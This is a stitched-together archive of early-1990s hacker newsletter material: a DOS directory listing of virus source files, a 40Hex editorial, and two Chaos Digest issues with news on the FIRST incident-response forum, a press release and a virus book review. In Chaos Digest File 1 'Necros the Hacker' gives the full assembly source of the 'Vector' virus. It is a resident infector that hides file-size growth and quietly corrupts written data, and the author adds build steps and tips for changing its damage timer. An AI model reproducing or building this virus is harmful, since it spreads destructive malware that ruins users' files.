FUNGUS   ASM     17120 12-21-91   1:37p
FUNGUS   SDF      4933 12-21-91   1:34p
HAP      ASM      2440 12-16-91  12:42p
HAPPY    ASM      7144 12-25-91  11:30a
HAPPY    COM       248 12-25-91  11:28a
HAPPY    MAP        99 12-25-91  11:28a
HAPPY    OBJ       424 12-25-91  11:28a
HEADER              94 12-09-91  10:25a
KENNEDY  ASM      6663 12-25-91  12:43a
KENNEDY  SDF      2803 12-25-91  12:43a
KILL     ASM       517 12-19-91   6:05p
MAR-INST BAT       205 08-31-91  12:13a
MAR-INST DOC      1037 08-31-91  12:20a
MARAUDER ASM     21997 12-23-91  10:21a
MARAUDER DOC      2305 12-20-91   9:40a
MAR_ASM! ZIP      5361 12-23-91  10:35a
MODES    ASM       244 12-25-91   7:22p
MODES    COM         7 12-25-91   7:22p
MODES    MAP        99 12-25-91   7:22p
MODES    OBJ       136 12-25-91   7:22p
NEW      ASM     21997 12-23-91  10:21a
NEW      COM       869 12-25-91  12:12a
NEW      MAP       103 12-25-91  12:12a
NEW      OBJ      1261 12-25-91  12:12a
NEW_KILL ASM      1318 12-23-91  10:29a
NEXT     ASM      2208 12-25-91  12:41a
PS       ANS      3218 11-25-91   9:43p
SECTOR   ASM      1573 12-11-91  10:52p
SS       DOC       270 08-08-91   3:00p
SS       EXE      6898 08-08-91   3:00p
TARGET   ASM       472 12-20-91   3:32p
TARGET   COM       100 12-25-91   8:53p
TARGET   MAP       103 12-25-91   8:53p
TARGET   OBJ       261 12-25-91   8:53p
       60 file(s)     348507 bytes

Directory of C:\TASM\LAB\LAB

.            
     12-10-91   8:46p
..           
     12-10-91   8:46p
        2 file(s)          0 bytes

Total files listed:
      147 file(s)    2287766 bytes
                     1843200 bytes free

+++++

40Hex Issue 4                                            December 1991

                            Is This The End?
                            ++++++++++++++++

   Well, to be honest.  I'm kind of tired writing this magazine.  It's
   not like I hate it or anything, it's just too much pressure for one
   person to handle.  Decimator helped me out a bit with a few articals
   and such.  But still every time I do an issue it's me who does the
   marjority of the work.  It seems the magazine is bigger than I
   thought.  It seems to be on everybodys BBS from NY to California,
   from Canada to Europe.  The thing is I can't write this thing by
   myself anymore.  I work everyday from 2pm - 10pm and I will be going
   back to school next semester.  So I don't have time to handle all the
   things I do.  So in the long run the magazine suffers.  Anyway,
   unless people want to help out (mabey the reason is that I haven't
   really asked before) lemme know.  Contact me on Digital Warefare.
   The numbers in an artical in this issue somewhere I'm sure.  Anyway,
   fuck it, If people don't contribute soon this may well be the last
   issue of this rag ever.  So whatever happens in 1992, we shall see.
   So if this is it, later people.  My viruses will still be coming on
   strong as always...

   Later
   Hellraiser 12/26/91

------------------------------

Date: Thu Jun  3 01:48:14 -0400 1993
From: postmaster@whitehouse.gov
Subject: File 2--Adresse electronique de Bill Clinton (news)

[ChaosD: Voici la reponse recu a un courrier envoye ce matin au President
des Etats-Unis sur sa nouvelle messagerie ouverte le premier du mois:
President@WhiteHouse.gov.]


     Thank you for sending in your thoughts and comments to the
President via electronic mail.  We are pleased to introduce this
new form of communication into the White House for the first time
in history.  I welcome your response and participation.

     As we work to reinvent government and streamline our
processes, this electronic mail experiment will help put us on
the leading edge of progress.  Please remember, though, this is
still very much an experiment.

     Your message has been read, and we are keeping careful track
of all the mail we are receiving electronically.  We will be
trying out a number of response-based systems shortly, and I ask
for your patience as we move forward to integrate electronic mail
from the public into the White House.

     Again, on behalf of the President, thank you for your
message and for taking part in the White House electronic mail
project.

                                  Sincerely,

                        Marsha Scott, Deputy Assistant
                        to the  President and Director
                              of Correspondence

------------------------------

Date: May 29, 1993 08:47:48 GMT
From: gregory@email.teaser.com (Gregory Noe )
Subject: File 3--FIRST, nouveau forum anti-hackers aux USA (lutte)
Copyright: Worldwide Videotex & The Baltimore Sun, 1993


RESPONSE GROUP FORMED TO HANDLE INTERNATIONAL COMPUTER AND NETWORK SECURITY
     PROBLEMS
Mainframe Computing      May 00, 1993   V. 6   NO. 5    p.  1

Government  and  private  organizations  in  North  America  and Europe are
joining  forces  to help combat and prevent the world's escalating computer
and network security problems.

Known  as  the   *Forum  of  Incident  Response  and  Security  Teams*,  or
FIRST,  the  coalition  brings  together  a  variety  of  computer security
incident  response  teams  from  the public and private sectors, as well as
from  universities.  FIRST  aims  to foster cooperation and coordination in
incident  prevention, to prompt rapid reaction to incidents, and to promote
information  sharing  among its members. FIRST currently includes more than
20  response  teams  and  liaisons  (see  attached  list  of  participating
organizations).

Participation  in  FIRST is voluntary, and member teams must fund their own
involvement.  One  of  FIRST's  chief  goals  is  to  expand  the number of
participating  incident  response teams and to foster increased cooperation
in incident response-related activities.

In  general,  a response team is set up to serve a defined constituency. In
many  cases,  a team serves a single organization's computer network users.
Other  teams are operated by computer vendors and deal primarily with their
specific  operating  systems.  Incident response teams generally augment an
organization's  overall  computer  security efforts by focusing on computer
security incidents.

The  FIRST  Secretariat  is  responsible  for  various  administrative  and
coordination activities. The National Institute of Standards and Technology
serves as the secretariat.

"Computer  security vulnerabilities associated with information technology,
such   as  malicious  abuse  or  viruses,  require  a  rapid,  skilled  and
coordinated  response  to  minimize  damage,"  said  Dennis  Steinauer, who
oversees  NIST's  participation  in  FIRST  and  chairs  the FIRST Steering
Committee.  "For  a  response  team  to  be  effective,  it must have rapid
communication  both  within  its  own  constituency and with other incident
response  teams.  That's  what FIRST aims to accomplish." FIRST members, he
said,  use  automatic  alerting mechanisms, electronic mail and a number of
other methods to achieve this rapid communication.

FIRST is working to achieve  several goals:

*  To boost cooperation among information technology users in the effective
prevention, detection and recovery from computer security incidents;

*  To  provide a means to alert and advise clients on potential threats and
emerging incident situations;

*  To  support  and  promote  the  actions  and activities of participating
incident response teams, including research and operational activities; and

*  To  simplify  and encourage the sharing of security-related information,
tools and techniques.

FIRST  membership has grown quickly from 11 original teams to more than 20.
Although   initial   membership  consisted  primarily  of  U.S.  government
organizations, membership of private-sector organizations, universities and
non-U.S.   organizations   is   growing.   Many   are  finding  that  FIRST
participation  offers  extensive  information  and  help  in  combating and
preventing  computer  security  incidents.  FIRST officials state, however,
that  members  are expected to participate actively in the forum. The FIRST
Secretariat  can  provide  information on establishing an incident response
capability  and  on  FIRST  membership.

For more information, contact:

FIRST Secretariat
Attn:  Dennis Steinauer
National Institute of Standards and Technology
A216 Technology Building
Gaithersburg, MD 20899-0001
Phone: (301)975-3359
Electronic Mail: first-sec@nist.gov.

+++++

COMPUTER SECURITY EXPERTS ON THE ALERT
BALTIMORE MORNING SUN (BS) - Monday, May 24, 1993
By: Steve Auerweck Staff Writer
Edition: Final  Section: Financial  Page: 12C


On  Nov. 2, 1988, Robert Morris, a Cornell University graduate student from
Arnold, set loose a "worm" that soon disabled thousands of computers on the
Internet, an enormous but loose conglomeration of computers nationwide.

   Not  long afterward, a group of computer security experts meeting at the
National Security Agency headquarters at Fort Meade to discuss the disaster
laid  the  groundwork  for  FIRST, the *Forum  of  Incident   Response  and
Security Teams.

   FIRST,  coordinated  out  of  the  National  Institute  of Standards and
Technology  offices  in  Gaithersburg,  is a coalition of computer security
response teams from both the public and private sectors.

   Dennis  Steinauer,  chairman  of the FIRST steering committee, describes
the need this way: "As more and more organizations get themselves hooked up
to  networks  .  .  .  the threat population has increased, or at least the
avenues of exposure."

   So  FIRST  now  brings  together a variety of outfits that might need to
respond  swiftly  to security threats. They range from teams at the Defense
Department  to  US Sprint, the Space Physics Analysis Network in France and
the Government Centre for Information Systems in the United Kingdom.

   The  idea  is to provide swift communication among members about current
or potential problems, such as computer viruses or virulent hackers.

   "We're  not  a  professional or educational organization," Mr. Steinauer
says. "This is an operational activity."

   Their  main  avenue  of  communication  is  the  Internet, but they also
learned  a  lesson  in  1988. "We have backup methods in place that we test
from time to time," Mr. Steinauer says, "including the telephone."

   FIRST  is  contemplating  staging "a fairly extensive drill"; it has not
yet been challenged by any major incidents.

COMPUTER SCIENCES LAB WINS DEFENSE CONTRACT

   Computer  Sciences  Corp.  learned  last  week that its Network Security
Integration  Laboratory,  located  near  Fort  Meade,  won a $19.9 million,
four-year  contract to provide information security services to the Defense
Department.

   The  laboratory  works with the National Computer Security Center, which
is  affiliated  with  the  NSA.  The  Anne Arundel lab averages 40 workers,
supported  by  another  60  at  CSC's Systems Engineering Division in Falls
Church, Va. No new positions are anticipated here.

   CSC,  headquartered  in  El  Segundo,  Calif., had received a $6 million
contract for the first phase of the project last October.

   Its  security laboratory evaluates encryption devices built for computer
networks,  telephones,  fax machines and the like, and helps users put them
to work in specific applications. It also tests security systems and builds
mock-ups for Defense Department projects.

DIGITAL OFFERS $5,000 TO BREAK V-CARD SYSTEM

   Digital  Enterprises  Inc.  of Gaithersburg has a challenge for hackers:
Break its anti-virus scheme and win $5,000.

   The  company  sells a hardware/software protection system called V-Card.
If  you  can  beat  the  machine at its headquarters -- no Trojan horses or
bombs allowed, the company says -- you'll win the prize.

   Enterprising hackers can call Digital at (301) 926-6937.

MICROPROSE GAMES HEADED FOR CD FORMATS

   Hunt  Valley's MicroProse Software Inc. has licensed several of its most
popular  game  titles  to  Capitol  Multimedia  Inc. for release in two new
mass-market  compact  disk  formats.  The  Washington company will develop,
market  and  distribute the games for CD-I (CD-Interactive) and Sony CD-ROM
XA machines.

   The  titles  covered  by  the  worldwide  pact  are Sid Meier's Pirates,
Railroad  Tycoon  and  Civilization, as well as Silent Service and Airborne
Ranger.

WAVERLY TO DISTRIBUTE DAROX VIDEODISCS

   Waverly   Inc.'s   Electronic  Media  Division  will  be  the  exclusive
distributor  of interactive videodiscs put out for nursing schools by Darox
Corp. of La Jolla, Calif.

   Darox  now  has  32  titles  for  health  professionals, with more being
developed.  They  join other Waverly products for medical instruction, such
as  the  Medi-Sim  computer-assisted  instruction  programs  and  a line of
videos.

MAGAZINE SEEKS COMPUTER NIGHTMARES

   Has  your computer driven you right to the edge? Are you ready to hire a
disgruntled postal worker to blast the thing to smithereens? Do you long to
fold, spindle and mutilate?

   Put  those  problems  on  paper  and  you  may  win a restful weekend in
California, courtesy of San Diego's ComputorEdge Magazine.

   Its  Computer  Dementia  Contest  seeks a 1,000-word essay on your worst
computer nightmare. The most horrid wins a weekend out West.

   "We  have  a  couple  hundred entries so far," said the magazine's Kevin
Leap.  "Some are pretty hilarious. There was a guy who got Doritos stuck in
the  keyboard and woke up the next morning with 220,000 pages of the letter
'E.' "

   Send entries to P.O. Box 83086, San Diego, Calif. 92138. The deadline is
July 31.
--
*-*-*-*-*-*-*-*-*-*-*-*-*-*-         gregory@email.teaser.com
-    Gregory  NOE          *         ________________________
*    PARIS  (France)       -
-*-*-*-*-*-*-*-*-*-*-*-*-*-*

------------------------------

Date: 10 May 1993 03:17:51 GMT
From: doug@cc.ysu.edu (Doug Sewell )
Subject: File 4--Liste de diffusion de _The Hack Report_ (abonnement)


                      The Hack Report List

                 [hack@alive.ersys.edmonton.ab.ca]

The Hack Report is a monthly informational newsletter put out by Lee
Jackson, Co-Moderator of the FidoNet International SHAREWRE echo and
Moderator of the FidoNet WARNINGS echo which warns of hacked, hoax,
Trojan Hourse, and pirated files that have been seen posted on BBS
systems worldwide.  It is mainly MS-DOS oriented, although it does
have a few notes on programs for other computer platforms.  It is a
great aid for anyone who downloads files from a public access system.

There are many people who do not get quack, or any, access to the
latest version of the essential report.  This mailing list has been
created to allow fast efficient distribution of The Hack Report to
people with an Internet mail address who do not have easy access to
it via other means such as anonymous FTP or through FidoNet.  This is
a one-directional list soley for the distribution of The Hack Report
each month.

To subscribe to The Hack Report mailing list, please send requests to
the human monitored address hackalive.ersys.edmonton.ab.ca.

Owner:  Marc Slemko 
--
Doug Sewell, Tech Support, Computer Center, Youngstown State University
doug@cc.ysu.edu    doug@ysub.bitnet     !cc.ysu.edu!doug

------------------------------

Date: Mon May 31 23:47:20 -0700 1993
From: park@netcom.com (Bill Park )
Subject: File 5--Autre type de chaos (identification)

> that present some security aspects: frauds, hacking, swapping,
> legislation, phreaking...

Ooops!  Sorry, I though the journal was about the nonlinear dynamic systems
kind of choas.

Never mind,
Bill Park
=========

------------------------------

End of Chaos Digest #1.44
************************************

Chaos Digest                Lundi 7 Juin 1993        Volume 1 : Numero 45
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.45 (7 Juin 1993)
File 1--Le virus Vector (essai d'ecriture)
File 2--PowerBop, le portable Apple communicant sans fils (technique)
File 3--Critique de _Computer Virus Handbook_ de Highland (livre)
File 4--L'annuaire electronique [11] en langues etrangeres (acces)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Wed, 2 Jun 1993 14:03:46 +0100 (WET DST)
From: NTH@altern.com (Necros the Hacker )
Subject: File 1--Le virus Vector (essai d'ecriture)


                        The  Vector Virus
                                by
                        Necros the Hacker


This is a fairly simple virus I wrote a while back. However, for its size
it has some nice features, including

      * memory resident in the interrupt vector table;
      * hides file size increases;
      * infects COM programs on opening or execution;
      * small and subtle, but nasty, damage routine.

The main aim of the virus was to write something small and well-coded. At
376 bytes it's not tiny but it's small enough to fit into the interrupt
vector table. The side effects of placing the virus in the interrupt table
are that it may conflict with other programs which use the interrupts, but
more importantly it can go resident without users noticing a decrease in
system memory.

Ok, so that's the idea behind it. Now what does it do? Well, it's resident
in memory and infects COM programs when they're opened or executed. Notice
that's COM *programs*, not just files. It checks to see if the file is
actually a COM program with an EXE extension too. The virus has a timer
which counts up to 0FFFh & when this number of writes takes place in DOS
with the virus resident, it performs its damage. The damage is simply to
chnage the data that was written subtly --- a byte is dropped from the
start of the written block & appened to the end. So there's no change in
size of the file that was written. For EXE programs or archive programs or
backup programs this sort of error can ruin the whole file. At least it
makes the job of recovering the undamaged data from the damaged stuff very
difficult.

The virus also hides file size increases. Each infected file has its date
increased by a century, so it won't appear as being different in listings.
Only FCB calls are intercepted & massaged into subtracting the virus'
length. I couldn't be bothered to do it for handle calls cos FCBs are used
in the DOS dir command.

Anyway, I present this code more as a demonstration of how to do some
common things efficiently. I'm mainly interested in writing good code, so
if anyone's got any suggestions on how to make it better, you can comment
here if the list maintainer is in agreement.

Oh, one last thing. The assembler code is turned into a COM program using
tasm & tlink. The resultant program is actually an infector of a program
called test.com. Just create a simple  3-byte program & then run
vector.com which will infect the test program. There's a message at the
end of the virus which can be removed if you want. Don't just overwrite it
with your own. Removing it is a matter of moving the line just after
message db . . . to just before it. Another thing you might want to modify
is the damage timer . . . change 0fffh in the code to some other value.
I'll leave you figure out what to change it to yourself. It shouldn't be
too dificult :)

Have fun,
NTH

---------------------------------------------------------------------------
;VECTOR.ASM            Written by Necros the Hacker      12 Aug 1991
;TSR virus which resides in interrupt table

model tiny
code
      org 100h              ;makes no difference - relocatable
start:
      jmp shell             ;the non-resident part of the virus
;the three previous bytes are overwritten with host's first bytes
      org 103h
repair:
      mov si,[ds:101h]      ;find offset of virus from 100h
      mov di,100h           ;place to write original file bytes
      push di
      add si,di             ;si is now start of virus

      cld
      movsb
      movsw                 ;restore start of host

      push es
      xor bx,bx             ;suitably unused register
      mov es,bx
      mov cx,[es:0084h]     ;offset of int 21 handler
      mov dx,[es:0086h]     ;segment of int 21 handler
      push ax
      mov ax,4bf1h
      int 21h
      mov di,ax
      pop ax
      cmp di,0abc0h         ;signature
      jz restart_host       ;already installed

      sub si,3              ;point to start of virus again

;code to make resident and hook vectors
;first save the old vector (in this copy)
      mov (old_int_21-100h)[si],cx
      mov (old_int_21-0feh)[si],dx

;now make the copy!
      mov di,07bh*4
      mov cx,virus_length
      rep movsb

;now hook the vector proper
      cli
      mov [es:0084h],offset handler_offset
      mov [es:0086h],cx
      sti

;and fall through to restart the host

restart_host:
      pop es
      ret                   ;start host (note AX unchanged by virus)

jump_buf_offset equ $-100h+07bh*4
jump_buf db 0e9h,0,0        ;jump to replace start of host

modify_dir proc near
      pushf
      call dword ptr cs:chain_offset
      cmp al,0ffh
      je ret_error
      push es
      push bx
      push ax
      mov ah,2fh
      int 21h
      cmp byte ptr es:[bx],0ffh      ;is extended FCB?
      jne not_extended
      add bx,7
not_extended:
      cmp byte ptr es:[bx+1ah],51    ;year>2105 AD?
      jbe no_mods
      sub word ptr es:[bx+1dh],virus_length
no_mods:
      pop ax
      pop bx
      pop es
ret_error:
      iret

modify_dir endp

;new int 21 handler
      even                  ;although the virus is relocatable, it will
                            ;always be on an even address when resident

chain_offset equ $-100h+07bh*4       ;alsolute address to chain to
old_int_21 dw 0,0

handler_offset equ $-100h+07bh*4
new_handler proc
      cmp ax,4bf1h          ;residency request
      jne is_dir
      mov ax,0abc0h
      iret

is_dir:
      cmp ah,11h
      je modify_dir
      cmp ah,12h
      je modify_dir

      cmp ah,40h            ;write?
      jne is_open
      cmp bl,3              ;don't affect stdout/stderr/stdin
      jb damage_ok
      inc dx                ;perform damage
      dec word ptr cs:[offset counter_offset]
      jz damage_ok
      dec dx                ;not time for damage, so undo it
damage_ok:
      and word ptr cs:[offset counter_offset],0fffh
      jmp normal_handler

is_open:
      cmp ah,3dh            ;open file (read only)
      jne is_exec

;infect only COM (or EXE) files when opened
      push ax
      push si
      mov si,dx
      cld
find_extension:
      lodsb
      or al,al
      je no_infect
      cmp al,'.'            ;look for the extension
      jne find_extension

;OK now check to see if the extension is COM or EXE
      lodsb
      or al,20h
      cmp al,'c'
      jne try_exe
      lodsw
      or ax,2020h
      cmp ax,'mo'
      jne no_infect
      je eligible
try_exe:
      lodsw
      or ax,2020h
      cmp ax,'ex'
      jne no_infect
eligible:
      pop si
      pop ax
      jmp infect_file

no_infect:
      pop si
      pop ax
      jmp normal_handler

is_exec:
      cmp ax,4b00h            ;EXEC?
      jne normal_handler

infect_file:
;code to infect the file
      push ax
      push bx
      push cx
      push dx
      push ds

;open the file for infecting
      mov ax,3d02h
      xor cx,cx
      pushf

      call dword ptr cs:chain_offset
      jc restore_regs
      mov bx,ax

      push cs
      pop ds

      mov ah,3fh            ;read from handle
      mov cx,3              ;first three bytes
      mov dx,07bh*4h        ;to start of virus (jumped over)
      int 21h
      jc no_date_set        ;only small files

      cmp ds:[07bh*4],'ZM'  ;EXE file?
      je no_date_set

      mov ax,5700h          ;get time and date stamp
      int 21h
      push cx
      push dx
      cmp dh,51             ;year>=2005 (1980+25+1 from month)
      ja close_file

      pop dx
      add dh,200            ;gives same year in next century
      push dx               ;will be set before closing

      mov ax,4202h          ;LSEEK to end of file
      xor cx,cx
      xor dx,dx
      int 21h

      mov word ptr offset jump_buf_offset+1,ax ;save length of host

;while we're here, append the virus
      mov ah,40h
      mov cx,virus_length
      mov dx,07bh*4
      int 21h
      jc close_file

      mov ax,4200h           ;LSEEK to start of file
      xor cx,cx
      xor dx,dx
      int 21h

      mov ah,40h             ;write with handle
      mov cx,3
      mov dx,offset jump_buf_offset
      int 21h

close_file:
      pop dx
      pop cx
      mov ax,5701h            ;reset time and date
      int 21h
no_date_set:
      mov ah,3eh
      int 21h
restore_regs:
      pop ds
      pop dx
      pop cx
      pop bx
      pop ax

normal_handler:               ;either open or EXEC
      jmp dword ptr cs:chain_offset
new_handler endp

counter_offset equ $-100h+07bh*4
counter dw 0                  ;when counter reaches zero, byte is "lost"

message db 'V3.0 [VECTOR] (c) Necros the Hacker',10,13
        db 'Written Aug 1991 in Tralee, Ireland',10,13

virus_length equ $-start

shell:
;open the file for infecting
      mov ax,3d02h
      xor cx,cx
      mov dx,offset filename
      int 21h
      jc shell_error
      mov bx,ax

      mov ah,3fh              ;read from handle
      mov cx,3                ;first three bytes
      mov dx,0100h            ;to start of virus (jumped over)
      int 21h
      jc shell_error

      mov ax,4202h            ;LSEEK to end of file
      xor cx,cx
      xor dx,dx
      int 21h

      mov word ptr jump_buf+1,ax    ;save length of host

;while we're here, append the virus
      mov ah,40h
      mov cx,virus_length
      mov dx,0100h
      int 21h
      jc shell_error

      mov ax,4200h            ;LSEEK to start of file
      xor cx,cx
      xor dx,dx
      int 21h

      mov ah,40h              ;write with handle
      mov cx,3
      mov dx,offset jump_buf
      int 21h

      mov ah,3eh
      int 21h

exit_stub:
      mov ax,4c00h
      int 21h
shell_error:
      mov ah,9
      mov dx,offset err$
      int 21h
      jmp exit_stub
err$ db 'Error infecting file',10,13,'$'
filename db 'test.com',0
end start

------------------------------

Date: Fri Jun  4 12:07:00 -0600 1993
From: cccf@email.teaser.com (cccf )
Subject: File 2--PowerBop, le portable Apple communicant sans fils (technique)

               Apple European R&D extends mobile computing
                     with wireless communications


Paris La Defense, June 4, 1993--With PowerBop, the first notebook
integrating cordless communications technology, recently launched in
France, Apple European R&D extands mobile computing and enhances
communications capabilities. PowerBop, the newest model of the popular
PowerBook series, offers the highest degree of autonomy on the notebook
computer market today.

The ongoing technical cooperation between Apple European R&D Centre based
in Paris, and France Telecom, the French PTO operator resulted in the
integration of radio capabilities with notebook computers making it
possible to connect them to Telepoint services.  Telepoint is expanding
more and more in Europe and uses the most affordable wireless technology
available today.

Apple European R&D focuses primarily on modems, on telecommunications in
mobile computers and on products that comply with OSI (Open System Inter-
connection) standards.


PowerBop: A new dimension in communications freedom
+---------------------------------------------------

PowerBop brings notebook users an added dimension of freedom, above and
beyond the inherent benefits of Apple's popular PowerBook models.  The
PowerBop contains a radio modem conform to the CT2 Telepoint standard in
accordance with the Common Air Interface (CAI), adopted in June 1991 on an
European level.  The CT2 standard allows a new generation of personal
telephones.  Their owners are able to use them in public places in large
cities, at home as a traditional cordless phone and in the office via PBX
extensions.

Within the PowerBop, the radio modem CT2 provides the ability to connect
it to a full range of communications services, at any time, from any place
that is located between 20 and 500 meters from the base station of the
Pointel network "Bi-Bop", launched by France Telecom in Paris and
Strasbourg on April 22,1993.  These services include: access to the France
Telecom videotex service "Minitel", message and file exchange, fax
transmission, access to servers and databases.

Thanks to the low energy consumption of the CT2 technology, the PowerBop
retains its 1 - 1/2 to 2 hours of endurance when the wireless modem is
being used.

The PowerBop features all the advantages of the PowerBook 180, Apple's
high-end notebook.  The internal floppy disk drive is replaced by the CT2
modem which means that users do not need to carry any additional equipment
to communicate via the telepoint network.  An external floppy disk drive is
supplied as a standard accessory.

Like the Bi-Bop pocket phone designed and developped by France Telecom, the
Apple PowerBop has a small antenna which folds into a special slot.

The Express Modem provided as standard equipment inside the PowerBop,
offers a full range of communications functions:

   * access to one of the 15,000 Minitel services;
   * fax transmision (reception will be available on the French
     network from Septembre 1993);
   * data transmission from 300 to 14,400 bps.

The Express Modem can either be connected directly to a telephone line or
use the Bi-Bop network for wireless communications up to 9,600 bps.


Digital Cordless Market
+-----------------------

European operators view telepoint as a mass market application for wireless
telephones.  At the present time, no European country offers a nationwide
commercial telepoint service.  However there are currently a number of
networks of this type spreading out.  Mainly, in the UK, Netherlands,
Finland and Belgium.

In other parts of the world, others such developments are under way, in
Asia, Australia, Canada and the United-States.

On the sales side, it appears that all the operators have a common desire
to implement a pricing structure to allow this technology to be affordable
for a consumer market.


France Telecom's new Bi-Bop service
+-----------------------------------

France Telecom took a leading role in the development of European telepoint
services.  On April 22, France Telecom launched the Bi-Bop cordless digital
pocket phone in Paris.  The system which employs the CT2 cordless standard,
sets up a digital radio link between the Bi-Bop terminal and a public or
home base station.

The Bi-Bop service covers three main types of use:

   * Public use: Bi-Bop subsribers can call anywhere in the world from
     major cities, starting with Paris and Strasbourg.  The network is
     designed to cover major thoroughfares and public places.  Today, some
     3,000 base stations (4,000 by fall 1993) span Paris and the greater
     Paris area (Ile-de-France) and the network will be progressively
     extended to other areas.  Starting in September 1993, subscribers will
     also be able to receive calls, and PowerBop notebook users will have
     fax reception capacities;

   * With a private home base station connected to a standard telephone
     outlet, the PowerBop is transformed into a high-performance mobile
     computing tool allowing one to access all private communications
     services;

   * Wireless PBXs are available to companies, allowing PowerBop users
     anywhere at a site, for example, to benefit from the same computing
     environment as if the user was at his desk.  The PowerBop can also
     become a mobile fax terminal.


Availability
+------------

The PowerBop will be available through certified Apple Computer France
distributors in June 1993.  PowerBop owners must have a special telephone
subscription with France Telecom.


Nota Bene
+---------

At this time, I am in a luxurous cafe on the Champs-Elysees in Paris in
holidays and I send this note to ChaosD with my PowerBop... without any
problem...

------------------------------

Date: Fri Jun  4 12:07:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 3--Critique de _Computer Virus Handbook_ de Highland (livre)
Copyright: Robert M. Slade, 1993


Elsevier
Mayfield House
256 Banbury Road
Oxford OX2 7DH
England
655 Avenue of the Americas
New York, NY   10010
USA
212-989-5800
fax: 212-633-3990

              Computer Virus Handbook, Harold Joseph Highland
                         1990, 0-946395-46-2

When Dr. Highland first offered to send me a copy of this work, late in 1992,
he indicated that it was outdated.  In some respects this is true.  Some of
the precautions suggested in a few of the essays which Dr. Highland did not
write tend to sound quaint.  As one example, with the advantage of hindsight,
Jon David's ten page antiviral review checklist contains items of little use,
and has a number of important gaps.  However, for the "general", rather than
"specialist" audience, this work has much to recommend it.  The coverage is
both broad and practical, and the information, although not quite up to date,
is complete and accurate as far as it goes.

The book starts with, as the title has it, "Basic Definitions and Other
Fundamentals".  Dr. Highland has collected definitions from a number of
sources here, which makes a refreshing change from some of the dogmatic
assertions in other works.  The fact that the reader is left to make his own
final decision as to a working definition might be frustrating to some, but
is likely reasonable given that the argument over the definition of a virus
is still raging to this day.  With the changes that are still taking place
in terms of new "forms" of viral programs, it is unlikely that this debate
will be settled any time soon.

Chapter one also contains important background information on the operation of
the PC and the structure of MS-DOS format disks.  The one shortcoming might be
that so much of the book deals with MS-DOS machines that readers dealing with
other systems may fail to note the generic concepts contained therein.

Chapter two is a concise but encompassing overview of the viral situation by
William Hugh Murray.  Using epidemiology as a model, he covers the broad
outline of viral functions within a computing "environment", and examines some
theoretical guidelines to direct the building of policy and procedures for
prevention of viral infection.  The article is broadly helpful without ever
pushing the relation between computer viral and human epidemiology too far.

Chapter three deals with history and examples of specific viral programs. This
section is an extremely valuable resource.  While other works reviewed have
contained similar sections, the quality of this segment in Highland's tome is
impressive.  Mention must be made of the reports by Bill Kenny of Digital
Dispatch who provides detailed and accurate descriptions of the operations of
a number of viral programs which are, unfortunately, all still too common.
(Chapter four is similar, containing three reports of viral programs from
other sources.)

Large sections of the handbook deal with the evaluation and review of
antiviral software.  (I must say that I had great sympathy with that part of
the preface which dealt with some experiences encountered when trying to
test various packages.)  Chapter five gives an evaluation protocol and test
methodology.  The detail here may lead some to skip over it, but it is
helpful to those who wish to determine how thoroughly the testing was
conducted.  Chapter six, an article by Jon David as mentioned earlier, is
a suggested procedure and checklist for testing antiviral software.  This
chapter is unfortunately weak, and although there is some valuable direction,
one comes away with the impression that the important thing to test is
whether the program runs on a VGA monitor and has a bound manual.  One must,
of course, realize that antiviral testing was then in its infancy, and Mr.
David's article reflects the general tone fo those times.  Chapter seven is
concerned with specific product evaluations, and, as most lists of its type
do, shows its age.  Of the twenty products listed, I recognize only seven
as still being in existence,; of those that still do exist four have changed
substantially in the intervening three years.

Chapter eight is an essay by Harry de Maio entitled "Viruses - A Management
Issue", and it must be considered one of the "forgotten gems" of virus
literature.  It debunks a number of myths, and raises a number of issues
seldom discussed in corporate security and virus management.  Chapter nine
is similar, being Dr. Highland's suggested procedures for reducing the risk
of computer virus infection.

Chapter ten is a collection of essays on theoretical aspects of computer virus
research and defence.  Fred Cohen is heavily represented here, of course, but
not as singularly as in, for example, Hoffman's "Rogue Programs".

Dated as the book may be in some respects, it is still a valuable overview
for those wishing to study viral programs or the defence against them,
particularly in a corporate environment.  While some may find the book to
be "academic" in tone, it never launches into "blue sky" speculations: all
of the material here is realistic.  The "aging" of the product reviews makes
it difficult to consider it still a reference "handbook" or a "how to"
resource, but Dr. Highland's work is by no means to be discarded yet.

+++++++++++++++
Vancouver      ROBERTS@decus.ca    | "Do you get guns with your
Institute for  Robert_Slade@sfu.ca |  gun magazines?  No.
Research into  rslade@cue.bc.ca    |  Do you get viruses with your
User           p1@CyberStore.ca    |  virus magazines?  Yes."
Security       Canada V7K 2G6      |               - Kevin Marcus

